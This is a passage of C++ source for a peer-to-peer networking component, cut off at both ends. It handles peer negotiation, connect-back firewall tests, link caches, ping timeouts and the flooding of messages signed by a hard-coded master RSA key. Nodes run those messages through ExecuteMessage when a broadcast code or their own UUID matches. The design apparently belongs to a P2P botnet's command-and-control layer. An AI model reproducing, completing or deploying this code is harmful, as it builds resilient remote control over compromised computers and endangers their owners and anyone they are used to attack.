											UINT i2l = P2P2Instance->ConnectionList.GetItem(i)->GetSize();
											for(UINT i2 = 0; i2 < i2l; i2++){
												Connection* Connection = P2P2Instance->ConnectionList.GetItem(i)->GetItem(i2);
												if(Connection->Ready() && Connection->GetConnectionType() == Type){
													if(Socket.GetPeerAddr() == Connection->GetSocketP()->GetPeerAddr())
														AlreadyConnected = TRUE;
												}
											}
											P2P2Instance->ConnectionList.GetItem(i)->Mutex.Release();
										}

										if(Type == TYPE_LINK){
											PCHAR Host = inet_ntoa(SocketFunction::Stoin(Socket.GetPeerAddr()));
											if(WhiteList.Matches(Host)){
												if(!AlreadyConnected){
													if(TransformConnection(TYPE_LINK)){
														Socket.Sendf("%d\r\n", RPL_TRANSFORM);
														CHAR Host[256];
														Socket.GetPeerName(Host, sizeof(Host));
														CHAR EncodedName[256];
														LinkCache::EncodeName(EncodedName, sizeof(EncodedName), Host, Port);
														LinkCache::AddLink(EncodedName);
														//P2P2Instance->BroadcastMessage(this, "0", MAX_NEWLINK_TTL, EncodedName, "1", rand_r(0, 0xffffffff));
														DWORD MID = rand_r(0, 0xFFFFFFFF);
														P2P2Instance->BroadcastMessage(this, "3", MAX_NEWLINK_TTL, EncodedName, NULL, MID, 1);
														//P2P2Instance->BroadcastMessage2(NULL, "1", 0, EncodedName, NULL, MID, 1);
														#ifdef _DEBUG
														dprintf("transformed to link connection\r\n");
														#endif
													}else{
														#ifdef _DEBUG
														dprintf("cannot link\r\n");
														#endif
														Close(ERR_CONNECTION_CLASS_FULL);
													}
												}else{
													#ifdef _DEBUG
													dprintf("link already connected\r\n");
													#endif
													Close(ERR_CONNECTIONCLOSED);
												}
											}else{
												#ifdef _DEBUG
												dprintf("host not in white list\r\n");
												#endif
												Close(ERR_CBFIRST);
											}
										}else
										if(Type == TYPE_CLIENT){
											if(!AlreadyConnected){
												if(TransformConnection(TYPE_CLIENT)){
													Socket.Sendf("%d\r\n", RPL_TRANSFORM);
													#ifdef _DEBUG
													dprintf("transformed to client connection\r\n");
													#endif
												}else{
													#ifdef _DEBUG
													dprintf("unable transform to client connection\r\n");
													#endif
													Close(ERR_CONNECTION_CLASS_FULL);
												}
											}else{
												#ifdef _DEBUG
												dprintf("host already connected\r\n");
												#endif
											}
										}
									}
								}
							}else
							if(Ordinal == CMD_GETINFO){
								#ifdef _DEBUG
								dprintf("** P2P CMD_GETINFO received\r\n");
								#endif
								Socket.Sendf("%d|%d|", RPL_GETINFO, ConnectionCount.Client);
								UINT il = P2P2Instance->ConnectionList.GetSize();
								BOOL Switch = FALSE;
								for(UINT i = 0; i < il; i++){
									P2P2Instance->ConnectionList.GetItem(i)->Mutex.WaitForAccess();
									UINT i2l = P2P2Instance->ConnectionList.GetItem(i)->GetSize();
									for(UINT i2 = 0; i2 < i2l; i2++){
										Connection* Connection = P2P2Instance->ConnectionList.GetItem(i)->GetItem(i2);
										if(Connection->Ready() && Connection->GetConnectionType() == TYPE_LINK){
											if(Switch)
												Socket.Sendf(",");
											CHAR Host[256];
											Connection->GetSocketP()->GetPeerName(Host, sizeof(Host));
											CHAR Encoded[256];
											LinkCache::EncodeName(Encoded, sizeof(Encoded), Host, Connection->GetPort());
											Socket.Sendf("%s", Encoded);
											Switch = TRUE;
										}
									}
									P2P2Instance->ConnectionList.GetItem(i)->Mutex.Release();
								}
								Socket.Sendf("\r\n");
							}/*else
							if(Ordinal == CMD_SENDMSG){
								if(Item[6]){
									if(strlen(Item[5]) == RSAPublicKeyMasterLen * 2){
										#ifdef _DEBUG
										dprintf("** P2P CMD_SENDMSG received %s\r\n", Item[3]);
										#endif
										UCHAR Input[RSAPublicKeyMasterLen];
										// Convert ASCII to binary
										for(UINT i = 0; i < RSAPublicKeyMasterLen; i++){
											CHAR Digit[3];
											Digit[0] = Item[5][(i * 2)];
											Digit[1] = Item[5][(i * 2) + 1];
											Digit[2] = NULL;
											Input[i] = strtoul(Digit, NULL, 16);
										}

										UCHAR Output[MAX_RSA_MODULUS_LEN];
										UINT OutputLen = MAX_RSA_MODULUS_LEN;
										INT Ret = RSAPublicDecrypt(Output, &OutputLen, Input, sizeof(Input), &RSAPublicKeyMaster);
										if(Ret == 0 && OutputLen == 16){
											UCHAR Hash[16];
											MD5 MD5;
											MD5.Update((PUCHAR)Item[2], strlen(Item[2]));
											MD5.Update((PUCHAR)Item[1], strlen(Item[1]));
											MD5.Update((PUCHAR)Item[3], strlen(Item[3]));
											MD5.Finalize(Hash);

											BOOL Authentic = TRUE;

											for(UINT i = 0; i < 16; i++){
												if(Hash[i] != Output[i])
													Authentic = FALSE;
											}

											if(Authentic){
												P2P2Instance->BroadcastMessage(NULL, Item[3], atoi(Item[4]), Item[2], Item[5], strtoul(Item[1], NULL, 16));
												DWORD MID = strtoul(Item[1], NULL, 16);
												std::vector<DWORD>::iterator I = std::find(MIDList.begin(), MIDList.end(), MID);
												if(I == MIDList.end()){
													MIDList.push_back(MID);
													if(MIDList.size() > MAX_MIDS_STORE){
														MIDList.erase(MIDList.begin(), ++MIDList.begin());
													}
													if(atoi(Item[6]) == 1 && (strcmp(Item[3], "2") == 0 || strcmp(Item[3], "3") == 0 || WildcardCompare(Item[3], Config::GetUUIDAscii())))
														P2P2Instance->ExecuteMessage(Item[2]);
												}
											}
										}
									}
								}
							}*/
						}else
						if(GetPosition() == CLIENT){
							if(Ordinal == RPL_CONNECTBACK){
								if(State == WAIT_FOR_CONNECTBACK){
									if(Item[1]){
										#ifdef _DEBUG
										dprintf("** P2P RPL_CONNECTBACK received, ");
										#endif

										if(strcmp(Item[1], "0") == 0){
											#ifdef _DEBUG
											dprintf("firewalled\r\n");
											#endif
											ConnectBackCount.Failure++;
											if((ConnectionCount.Link == 0) && ((ConnectBackCount.Success == 0 && ConnectBackCount.Failure == 1) || ((float)ConnectBackCount.Success / ConnectBackCount.Failure) <= MODE_DECISION_RATIO)){
												ConnectionMode = MODE_CLIENT;
												Socket.Sendf("%d|%d\r\n", CMD_TRANSFORM, TYPE_CLIENT);
												TransformType = TYPE_CLIENT;
												State = TRANSFORM;
											}else{
												Close(ERR_CONNECTIONCLOSED);
											}
										}else{
											#ifdef _DEBUG
											dprintf("OK (ip = %s) requesting transformation\r\n", Item[1]);
											#endif
											ConnectBackCount.Success++;
											//LinkCache::RemoveLink(Item[1]);//Config::RemoveLink(Item[1]); // Remove self from link list
											//BlackList.Add(Item[1]);
											if((ConnectionCount.Link > 0) || ((ConnectBackCount.Success == 1 && ConnectBackCount.Failure == 0) || ((float)ConnectBackCount.Success / ConnectBackCount.Failure) >= MODE_DECISION_RATIO))
												ConnectionMode = MODE_LINK;
											TransformType = ConnectionMode == MODE_LINK ? TYPE_LINK : TYPE_CLIENT;
											Socket.Sendf("%d|%d|%s\r\n", CMD_TRANSFORM, TransformType, TempUnique);
											State = TRANSFORM;
										}
									}
								}
							}else
							if(Ordinal == RPL_TRANSFORM){
								if(State == TRANSFORM){
									if(TransformType == TYPE_LINK){
										#ifdef _DEBUG
										dprintf("** P2P got RPL_TRANSFORM, ");
										#endif
										if(TransformConnection(TYPE_LINK)){
											#ifdef _DEBUG
											dprintf("connection now linked\r\n");
											#endif
											if(LinkCache::GetLinkCount() < MIN_LINKS){
												State = GET_LINK_LIST;
												Socket.Sendf("%d\r\n", CMD_LISTLINKS);
											}else{
												Socket.Sendf("%d\r\n", CMD_GETVERSION);
											}
										}else{
											#ifdef _DEBUG
											dprintf("cannot link\r\n");
											#endif
											Close(ERR_CONNECTION_CLASS_FULL);
										}
									}else
									if(TransformType == TYPE_CLIENT){
										if(TransformConnection(TYPE_CLIENT)){
											ClientConnected = this;
											OnClientConnected();
											/*#ifdef _DEBUG
											dprintf("now connected as a client\r\n");
											#endif
											// Disconnect all other connections
											UINT il = P2P2Instance->ConnectionList.GetSize();
											for(UINT i = 0; i < il; i++){
												P2P2Instance->ConnectionList.GetItem(i)->Mutex.WaitForAccess();
												UINT i2l = P2P2Instance->ConnectionList.GetItem(i)->GetSize();
												for(UINT i2 = 0; i2 < i2l; i2++){
													Connection* Connection = P2P2Instance->ConnectionList.GetItem(i)->GetItem(i2);
													if(Connection != this){
														Connection->GetSocketP()->Shutdown();
													}
												}
												P2P2Instance->ConnectionList.GetItem(i)->Mutex.Release();
											}
											//
											State = GET_LINK_LIST;
											Socket.Sendf("%d\r\n", CMD_LISTLINKS);*/
										}else{
											#ifdef _DEBUG
											dprintf("unsuccessful\r\n");
											#endif
											Close(ERR_CONNECTION_CLASS_FULL);
										}
									}
								}
							}
						}
					}else
					if(GetConnectionType() == TYPE_LINK){
						/*if(Ordinal == MSG_MESSAGE){
							if(Item[5]){
								#ifdef _DEBUG
								dprintf("Received MSG_MESSAGE \"%s\" %s (%s)\r\n", Item[3], Item[5], Item[2]);
								#endif
								if(strcmp(Item[4], "1") == 0){
									DWORD TTL = atoi(Item[2]);
									if(TTL > MAX_NEWLINK_TTL)
										TTL = MAX_NEWLINK_TTL;
									DWORD MID = strtoul(Item[5], NULL, 16);
									std::vector<DWORD>::iterator I = std::find(MIDList.begin(), MIDList.end(), MID);
									if(I == MIDList.end() && TTL > 0){
										TTL--;
										CHAR Hostname[256];
										USHORT Port;
										LinkCache::DecodeName(Item[3], Hostname, sizeof(Hostname), &Port);
										if(!BlackList.Matches(Hostname)){
											MIDList.push_back(MID);
											if(MIDList.size() > MAX_MIDS_STORE){
												MIDList.erase(MIDList.begin(), ++MIDList.begin());
											}
											LinkCache::AddLink(Item[3]);
											P2P2Instance->BroadcastMessage(this, "0", TTL, Item[3], "1", MID);
										}
									}
								}else{
									DWORD TTL = atoi(Item[2]);
									if(TTL > MAX_MESSAGE_TTL)
										TTL = MAX_MESSAGE_TTL;
									DWORD MID = strtoul(Item[5], NULL, 16);
									std::vector<DWORD>::iterator I = std::find(MIDList.begin(), MIDList.end(), MID);
									if(I == MIDList.end() && TTL > 0){
										TTL--;
										MIDList.push_back(MID);
										if(MIDList.size() > MAX_MIDS_STORE){
											MIDList.erase(MIDList.begin(), ++MIDList.begin());
										}
										if(strlen(Item[4]) == RSAPublicKeyMasterLen * 2){
											UCHAR Input[RSAPublicKeyMasterLen];
											// Convert ASCII to binary
											for(UINT i = 0; i < RSAPublicKeyMasterLen; i++){
												CHAR Digit[3];
												Digit[0] = Item[4][(i * 2)];
												Digit[1] = Item[4][(i * 2) + 1];
												Digit[2] = NULL;
												Input[i] = strtoul(Digit, NULL, 16);
											}

											UCHAR Output[MAX_RSA_MODULUS_LEN];
											UINT OutputLen;
											INT Ret = RSAPublicDecrypt(Output, &OutputLen, Input, sizeof(Input), &RSAPublicKeyMaster);
											if(Ret == 0 && OutputLen == 16){
												UCHAR Hash[16];
												MD5 MD5;
												MD5.Update((PUCHAR)Item[3], strlen(Item[3]));
												MD5.Update((PUCHAR)Item[5], strlen(Item[5]));
												MD5.Update((PUCHAR)Item[1], strlen(Item[1]));
												MD5.Finalize(Hash);

												if(memcmp(Hash, Output, 16) == 0){
													P2P2Instance->BroadcastMessage(this, Item[1], TTL, Item[3], Item[4], strtoul(Item[5], NULL, 16));
													if(strcmp(Item[1], "2") == 0 || strcmp(Item[1], "3") == 0 || WildcardCompare(Item[1], Config::GetUUIDAscii()))
														P2P2Instance->ExecuteMessage(Item[3]);
												}
											}
										}
									}
								}
							}
						}*/
					}else
					if(GetConnectionType() == TYPE_CLIENT){
						if(GetPosition() == CLIENT){
							/*if(Ordinal == MSG_MESSAGE){
								if(Item[4]){
									#ifdef _DEBUG
									dprintf("Received MSG_MESSAGE\r\n");
									//dprintf("Received MSG_MESSAGE \"%s\" %s\r\n", Item[2], Item[4]);
									#endif
									if(strcmp(Item[3], "1") == 0){
										DWORD TTL = atoi(Item[2]);
										if(TTL > MAX_NEWLINK_TTL)
											TTL = MAX_NEWLINK_TTL;
										DWORD MID = strtoul(Item[4], NULL, 16);
										std::vector<DWORD>::iterator I = std::find(MIDList.begin(), MIDList.end(), MID);
										if(I == MIDList.end() && TTL > 0){
											TTL--;
											CHAR Hostname[256];
											USHORT Port;
											LinkCache::DecodeName(Item[2], Hostname, sizeof(Hostname), &Port);
											if(!BlackList.Matches(Hostname)){
												MIDList.push_back(MID);
												if(MIDList.size() > MAX_MIDS_STORE){
													MIDList.erase(MIDList.begin(), ++MIDList.begin());
												}
												LinkCache::AddLink(Item[2]);
											}
										}
									}else{
										DWORD MID = strtoul(Item[4], NULL, 16);
										std::vector<DWORD>::iterator I = std::find(MIDList.begin(), MIDList.end(), MID);
										if(I == MIDList.end()){
											MIDList.push_back(MID);
											if(MIDList.size() > MAX_MIDS_STORE){
												MIDList.erase(MIDList.begin(), ++MIDList.begin());
											}
											if(strlen(Item[3]) == RSAPublicKeyMasterLen * 2){
												UCHAR Input[RSAPublicKeyMasterLen];
												// Convert ASCII to binary
												for(UINT i = 0; i < RSAPublicKeyMasterLen; i++){
													CHAR Digit[3];
													Digit[0] = Item[3][(i * 2)];
													Digit[1] = Item[3][(i * 2) + 1];
													Digit[2] = NULL;
													Input[i] = strtoul(Digit, NULL, 16);
												}

												UCHAR Output[MAX_RSA_MODULUS_LEN];
												UINT OutputLen;
												INT Ret = RSAPublicDecrypt(Output, &OutputLen, Input, sizeof(Input), &RSAPublicKeyMaster);
												if(Ret == 0 && OutputLen == 16){
													UCHAR Hash[16];
													MD5 MD5;
													MD5.Update((PUCHAR)Item[2], strlen(Item[2]));
													MD5.Update((PUCHAR)Item[4], strlen(Item[4]));
													MD5.Update((PUCHAR)Item[1], strlen(Item[1]));
													MD5.Finalize(Hash);

													if(memcmp(Hash, Output, 16) == 0){
														if(strcmp(Item[1], "1") == 0 || strcmp(Item[1], "3") == 0 || WildcardCompare(Item[1], Config::GetUUIDAscii()))
															P2P2Instance->ExecuteMessage(Item[2]);
													}
												}
											}
										}
									}
								}
							}*/
						}
					}
				}
			}
		}
	}

	if(Timeout.TimedOut()){
		if(!Pinging){
			#ifdef _DEBUG
			dprintf("** P2P Ping interval passed, sending CMD_PING\r\n");
			#endif
			Socket.Sendf("%d\r\n", CMD_PING);
			Timeout.SetTimeout(PING_TIMEOUT);
			Timeout.Reset();
			Pinging = TRUE;
		}else{
			#ifdef _DEBUG
			CHAR Host[256];
			Socket.GetPeerName(Host, sizeof(Host));
			dprintf("** P2P %s ping timed out\r\n", Host);
			#endif
			Close(ERR_CONNECTIONCLOSED);
			Timeout.SetTimeout(NULL);
		}
	}
}

VOID P2P2::Connection::OnReady(VOID){
	if(GetPosition() == CLIENT){
		Port = Socket.GetPeerPort();
		if(ConnectionMode == MODE_CLIENT){
			ClientConnected = this;
			OnClientConnected();
		}else
		if(State == SEND_CONNECTBACK){
			#ifdef _DEBUG
			dprintf("** P2P sent CMD_CONNECTBACK\r\n");
			#endif
			Socket.Sendf("%d|%d\r\n", CMD_CONNECTBACK, Config::GetP2PPort());
			State = WAIT_FOR_CONNECTBACK;
		}
		CHAR EncodedName[256];
		LinkCache::EncodeName(EncodedName, sizeof(EncodedName), Link.Hostname, Socket.GetPeerPort());
		Link = LinkCache::GetLink(EncodedName);
		Link.SuccessfulConnections++;
		LinkCache::UpdateLink(Link);
	}else
	if(GetPosition() == HOST){
		State = WAIT_FOR_CONNECTBACK;
	}
	Timeout.SetTimeout(PING_TIMEOUT / 2);
}

VOID P2P2::Connection::ConnectBackDone(BOOL Success){
	ConnectBackThread = NULL;
	//State = TRANSFORM;
}

VOID P2P2::Connection::OnFail(UINT ErrorCode){
	Mutex.WaitForAccess();
	if(ConnectBackThread)
		ConnectBackThread->ConnectionClosed();
	Mutex.Release();
	if(ClientConnected == this && GetConnectionType() == TYPE_CLIENT && GetPosition() == CLIENT){
		#ifdef _DEBUG
		dprintf("** P2P Client lost connection\r\n");
		#endif
		ClientConnected = NULL;
	}
	if(ErrorCode == ERR_CONTIMEDOUT || ErrorCode == ERR_UNREACHABLE){
		if(GetPosition() == CLIENT){
			CHAR EncodedName[256];
			LinkCache::EncodeName(EncodedName, sizeof(EncodedName), Link.Hostname, Link.Port);
			Link = LinkCache::GetLink(EncodedName);
			Link.FailedConnections++;
			LinkCache::UpdateLink(Link);
			if(!Link.Permanent && LinkCache::GetLinkCount() > MIN_LINKS){
				LinkCache::RemoveLink(EncodedName);
			}
		}
	}
	if(CurrentMsg.Body){
		delete[] CurrentMsg.Body;
		CurrentMsg.Body = NULL;
	}
}

VOID P2P2::Connection::OnClientConnected(VOID){
	#ifdef _DEBUG
	dprintf("** P2P Now connected as a client\r\n");
	#endif
	// Disconnect all other connections
	UINT il = P2P2Instance->ConnectionList.GetSize();
	for(UINT i = 0; i < il; i++){
		P2P2Instance->ConnectionList.GetItem(i)->Mutex.WaitForAccess();
		UINT i2l = P2P2Instance->ConnectionList.GetItem(i)->GetSize();
		for(UINT i2 = 0; i2 < i2l; i2++){
			Connection* Connection = P2P2Instance->ConnectionList.GetItem(i)->GetItem(i2);
			if(Connection != this){
				Connection->Close(ERR_CONNECTIONCLOSED);
			}
		}
		P2P2Instance->ConnectionList.GetItem(i)->Mutex.Release();
	}
	//
	if(LinkCache::GetLinkCount() < MIN_LINKS){
		State = GET_LINK_LIST;
		Socket.Sendf("%d\r\n", CMD_LISTLINKS);
		#ifdef _DEBUG
		dprintf("** P2P Sent CMD_LISTLINKS\r\n");
		#endif
	}else{
		Socket.Sendf("%d\r\n", CMD_GETVERSION);
	}
}

VOID P2P2::Connection::PingReplied(VOID){
	Timeout.SetTimeout(PING_INTERVAL);
	Timeout.Reset();
	Pinging = FALSE;
}

P2P2::ConnectBackThread::ConnectBackThread(P2P2::Connection *Connection, USHORT Port){
	ConnectBackThread::Connection = Connection;
	Connection->GetSocketP()->GetPeerName((PCHAR)RemoteHost, sizeof(RemoteHost));
	RemotePort = Port;
	StartThread();
}

VOID P2P2::ConnectBackThread::ThreadFunc(VOID){
	BOOL Success = FALSE;
	Socket Sock;
	Sock.Create(SOCK_STREAM);
	if(Sock.Connect(RemoteHost, RemotePort) == ERROR_SUCCESS){
		Sock.EventSelect(FD_CLOSE);
		Sock.Shutdown();
		WSAEVENT hEvent = Sock.GetEventHandle();
		WSANETWORKEVENTS NetEvents;
		Timeout Timeout;
		Timeout.SetTimeout(SHUTDOWN_TIMEOUT);
		Timeout.Reset();
		while(1){
			WSAWaitForMultipleEvents(1, &hEvent, FALSE, 1000, FALSE);
			Sock.EnumEvents(&NetEvents);
			if(NetEvents.lNetworkEvents & FD_CLOSE){
				Success = TRUE;
				WhiteList.Add(RemoteHost);
				Sock.Disconnect(CLOSE_BOTH_HDL);
				break;
			}else
			if(Timeout.TimedOut()){
				Sock.Disconnect(CLOSE_BOTH_HDL);
				break;
			}
		}
	}else{
		strcpy(RemoteHost, "0");
		Sock.Disconnect(CLOSE_BOTH_HDL);
	}
	Connection->Mutex.WaitForAccess();
	#ifdef _DEBUG
	CHAR Host[256];
	Connection->GetSocketP()->GetPeerName(Host, sizeof(Host));
	dprintf("** P2P ConnectBackThread completed responding to %s with %s\r\n", Host, Success?"SUCCESS":"FAILURE");
	#endif
	Connection->GetSocketP()->Sendf("%d|%s\r\n", RPL_CONNECTBACK, RemoteHost);
	Connection->ConnectBackDone(Success);
	Connection->Mutex.Release();
}

VOID P2P2::ConnectBackThread::ConnectionClosed(VOID){
	InterlockedExchangePointer((void **)Connection, NULL);
}

P2P2::P2P2(BOOL Run){
	if(!P2P2Instance)
		P2P2Instance = this;
	else
		return;
	ConnectionCount.Client = 0;
	ConnectionCount.Control = 0;
	ConnectionCount.Link = 0;
	ConnectBackCount.Success = 0;
	ConnectBackCount.Failure = 0;
	memset(&RSAPublicKey, 0, sizeof(RSAPublicKey));
	memset(&RSAPrivateKey, 0, sizeof(RSAPrivateKey));
	// Load in the master's public key
	RSAPublicKeyMaster = RSA::MakePublicKey(RSAPublicKeyMasterLen * 8, RSAPublicKeyMasterModulus);
	for(UINT i = 0; i < sizeof(TempUnique); i++)
		TempUnique[i] = rand_r('a', 'z');
	TempUnique[sizeof(TempUnique) - 1] = NULL;

	if(Run)
		StartThread();
}

P2P2::~P2P2(){
	ListeningSocket.Disconnect(CLOSE_BOTH_HDL);
}

VOID P2P2::ThreadFunc(VOID){
	#ifdef _DEBUG
	dprintf("** P2P Thread started\r\n");
	#endif
	Initialize();

	WSAEVENT hEvent = ListeningSocket.GetEventHandle();
	WSANETWORKEVENTS NetEvents;
	INT SignalledEvent;
	ULONG Addr;
	BOOL AsyncDNSActive = FALSE;
	LinkCache::Link Link;
	MSG msg;
	Timeout ConnectTime;
	ConnectTime.SetTimeout(1);
	ConnectTime.Reset();
	while(1){
		// Connect outboundly to other links
		if(!ClientConnected && !AsyncDNSActive && ConnectTime.TimedOut()){
			ConnectTime.SetTimeout(OUTBOUND_CONNECTION_INTERVAL);
			ConnectTime.Reset();
			if((ConnectionMode != MODE_CLIENT && ConnectionCount.Link < MIN_LINK_CONNECTIONS) || (ConnectionMode == MODE_CLIENT && !ClientConnected)){
				Link = LinkCache::GetRandomLink();
				if(strcmp(Link.Hostname, "null") != 0){
					if((Addr = inet_addr(Link.Hostname)) == INADDR_NONE){
						new AsyncDNS(GetThreadID(), Link.Hostname, &Addr);
						AsyncDNSActive = TRUE;
					}else{
						PostThreadMessage(GetThreadID(), WM_USER_GETHOSTBYNAME, NULL, NULL);
					}
				}
			}
		}
		// Asynchronous DNS lookup replies handled here
		if(PeekMessage(&msg, NULL, 0, 0, PM_REMOVE) != 0){
			if(msg.message == WM_USER_GETHOSTBYNAME){
				AsyncDNSActive = FALSE;
				if(msg.wParam == 0 && !ClientConnected){
					Socket OutSocket;
					OutSocket.Create(SOCK_STREAM);
					OutSocket.EventSelect(FD_CONNECT);
					NegotiationQueue<Connection>* Temp = ConnectionList.Add(OutSocket);
					#ifdef _DEBUG
					dprintf("** P2P Connecting to %s (C:%d CL:%d L:%d)\r\n", inet_ntoa(SocketFunction::Stoin(Addr)), ConnectionCount.Control, ConnectionCount.Client, ConnectionCount.Link);
					#endif
					LinkCache::UpdateLastConnectionAttemptTime(&Link);
					LinkCache::UpdateLink(Link);
					Temp->GetLastAdded()->SetLinkCacheLink(Link);
					Temp->GetLastAdded()->Connect(inet_ntoa(SocketFunction::Stoin(Addr)), Link.Port, ConnectionMode==MODE_CLIENT?Negotiation::TYPE_CLIENT:Negotiation::TYPE_CONTROL);
				}
			}
		}
		// Incoming connections are always ready to be served
		if((SignalledEvent = WSAWaitForMultipleEvents(1, &hEvent, FALSE, 1000, FALSE)) != WSA_WAIT_TIMEOUT){
			SignalledEvent -= WSA_WAIT_EVENT_0;
			if(SignalledEvent == 0){
				ListeningSocket.EnumEvents(&NetEvents);
				if(NetEvents.lNetworkEvents & FD_ACCEPT){
					Socket NewSocket;
					ListeningSocket.Accept(NewSocket);
					CHAR Host[256];
					NewSocket.GetPeerName(Host, sizeof(Host));
					#ifdef _DEBUG
					dprintf("** P2P Accepted new connection from %s\r\n", Host);
					#endif
					if(ConnectionMode == MODE_CLIENT || BlackList.Matches(Host)){
						#ifdef _DEBUG
						dprintf("** P2P Disconnecting connection, blacklisted or in client mode\r\n");
						#endif
						NewSocket.Disconnect(CLOSE_BOTH_HDL);
					}else{
						BOOL AlreadyConnected = FALSE;
						UINT il = ConnectionList.GetSize();
						for(UINT i = 0; i < il; i++){
							ConnectionList.GetItem(i)->Mutex.WaitForAccess();
							UINT i2l = ConnectionList.GetItem(i)->GetSize();
							for(UINT i2 = 0; i2 < i2l; i2++){
								Connection* Connection = ConnectionList.GetItem(i)->GetItem(i2);
								if(Connection->Ready() && Connection->GetPosition() == HOST && Connection->GetConnectionType() != Negotiation::TYPE_CONTROL){
									if(NewSocket.GetPeerAddr() == Connection->GetSocketP()->GetPeerAddr()){
										#ifdef _DEBUG
										dprintf("** P2P Accepted connection already connected\r\n");
										#endif
										AlreadyConnected = TRUE;
										NewSocket.Disconnect(CLOSE_BOTH_HDL);
									}
								}
							}
							ConnectionList.GetItem(i)->Mutex.Release();
						}

						if(!AlreadyConnected){
							NewSocket.EventSelect(FD_READ | FD_CLOSE);
							ConnectionList.Add(NewSocket);
						}
					}
				}
			}
		}
	}
}

VOID P2P2::GenerateKeys(VOID){
	cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
	if(!Reg.Exists(REG_P2PKEYSIZE_VALUE))
		Reg.SetInt(REG_P2PKEYSIZE_VALUE, MIN_RSA_MODULUS_BITS / 8);
	UINT KeySize = Reg.GetInt(REG_P2PKEYSIZE_VALUE) * 8;
	if(KeySize < MIN_RSA_MODULUS_BITS)
		KeySize = MIN_RSA_MODULUS_BITS;
	if(KeySize > MAX_RSA_MODULUS_BITS)
		KeySize = MAX_RSA_MODULUS_BITS;
	#ifdef _DEBUG
	dprintf("** P2P Generating RSA keys (%d bits)\r\n", KeySize);
	#endif
	R_RANDOM_STRUCT RandomStruct;
	R_RSA_PROTO_KEY RSAProtoKey;
	RSAPublicKey.bits = KeySize;
	RSAProtoKey.bits = KeySize;
	RSAProtoKey.useFermat4 = TRUE;
	RSAPrivateKey.bits = KeySize;
	R_RandomInit(&RandomStruct);
	PUCHAR block = new UCHAR[RandomStruct.bytesNeeded];
	for(UINT i = 0; i < RandomStruct.bytesNeeded; i++)
		block[i] = (UCHAR)rand_r(0, 0xff);
	R_RandomUpdate(&RandomStruct, block, RandomStruct.bytesNeeded);
	delete[] block;
	Timeout TimeToGenerate;
	TimeToGenerate.Reset();
	R_GeneratePEMKeys(&RSAPublicKey, &RSAPrivateKey, &RSAProtoKey, &RandomStruct);
	DWORD ElapsedTime = TimeToGenerate.GetElapsedTime();
	if(ElapsedTime < 1000){
		KeySize += rand_r(1, 20) * 8;
	}else{
		KeySize -= rand_r(1, 20) * 8;
	}
	Reg.SetInt(REG_P2PKEYSIZE_VALUE, KeySize / 8);
	#ifdef _DEBUG
	dprintf("** P2P Done generating RSA keys (%f seconds)\r\n", (FLOAT)ElapsedTime / 1000);
	#endif
}

UINT P2P2::GetClientCount(VOID){
	return ConnectionCount.Client;
}

UINT P2P2::GetControlCount(VOID){
	return ConnectionCount.Control;
}

UINT P2P2::GetLinkCount(VOID){
	return ConnectionCount.Link;
}

BOOL P2P2::GetMode(VOID){
	return ConnectionMode;
}

ULONG P2P2::GetLinkedIP(VOID){
	if(ClientConnected){
		return ((Connection*)ClientConnected)->GetSocketP()->GetPeerAddr();
	}
	return NULL;
}

/*VOID P2P2::BroadcastMessage(Connection* Exempt, PCHAR SendTo, UINT TTL, PCHAR Message, PCHAR Signature, DWORD MID){
	if(!TTL)
		return;
	UINT il = ConnectionList.GetSize();
	for(UINT i = 0; i < il; i++){
		ConnectionList.GetItem(i)->Mutex.WaitForAccess();
		UINT i2l = ConnectionList.GetItem(i)->GetSize();
		for(UINT i2 = 0; i2 < i2l; i2++){
			Connection* Connection = ConnectionList.GetItem(i)->GetItem(i2);
			if(Connection != Exempt && Connection->Ready()){
				if(strcmp(Signature, "1") == 0 && Connection->GetConnectionType() == Negotiation::TYPE_LINK){ // NEWLINK message
					Connection->GetSocketP()->Sendf("%d|0|%d|%s|1|%X\r\n", MSG_MESSAGE, TTL, Message, MID);
				}else{
					if(TTL > 0 && Connection->GetConnectionType() == Negotiation::TYPE_LINK){
						Connection->GetSocketP()->Sendf("%d|%s|%d|%s|%s|%X\r\n", MSG_MESSAGE, SendTo, TTL, Message, Signature, MID);
					}
					if(strcmp(SendTo, "2") != 0 && Connection->GetConnectionType() == Negotiation::TYPE_CLIENT && Connection->GetPosition() == HOST){
						Connection->GetSocketP()->Sendf("%d|%s|%s|%s|%X\r\n", MSG_MESSAGE, SendTo, Message, Signature, MID);
					}
				}
			}
		}
		ConnectionList.GetItem(i)->Mutex.Release();
	}
}*/

VOID P2P2::BroadcastMessage(Connection* Exempt, PCHAR SendTo, UINT TTL, PCHAR Message, PCHAR Signature, DWORD MID, BOOL NewLinkMessage){
	BOOL FinalTTL = FALSE;
	if(TTL){
		TTL--;
	}else{
		FinalTTL = TRUE;
	}
	CHAR Null = 0;
	UINT il = ConnectionList.GetSize();
	for(UINT i = 0; i < il; i++){
		ConnectionList.GetItem(i)->Mutex.WaitForAccess();
		UINT i2l = ConnectionList.GetItem(i)->GetSize();
		for(UINT i2 = 0; i2 < i2l; i2++){
			Connection* Connection = ConnectionList.GetItem(i)->GetItem(i2);
			if(Connection != Exempt && Connection->Ready()){
				if(NewLinkMessage && ((Connection->GetConnectionType() == Negotiation::TYPE_LINK && !FinalTTL) || Connection->GetConnectionType() == Negotiation::TYPE_CLIENT)){
					Connection->GetSocketP()->Sendf("%d|%X|%d|%s|%d|0|1\r\n", MSG_MESSAGE, MID, strlen(Message) + 1, SendTo, TTL);
					if(strlen(Message) > 0)
						Connection->GetSocketP()->Send(Message, strlen(Message));
					Connection->GetSocketP()->Send(&Null, sizeof(Null));
				}else{
					if(!FinalTTL && Connection->GetConnectionType() == Negotiation::TYPE_LINK){
						Connection->GetSocketP()->Sendf("%d|%X|%d|%s|%d|0|0\r\n", MSG_MESSAGE, MID, strlen(Message) + 1, SendTo, TTL);
						Connection->GetSocketP()->Send((PCHAR)Signature, RSAPublicKeyMasterLen);
						if(strlen(Message) > 0)
							Connection->GetSocketP()->Send(Message, strlen(Message));
						Connection->GetSocketP()->Send(&Null, sizeof(Null));
					}
					if(strcmp(SendTo, "2") != 0 && Connection->GetConnectionType() == Negotiation::TYPE_CLIENT && Connection->GetPosition() == HOST){
						Connection->GetSocketP()->Sendf("%d|%X|%d|%s|%d|0|0\r\n", MSG_MESSAGE, MID, strlen(Message) + 1, SendTo, TTL);
						Connection->GetSocketP()->Send((PCHAR)Signature, RSAPublicKeyMasterLen);
						if(strlen(Message) > 0)
							Connection->GetSocketP()->Send(Message, strlen(Message));
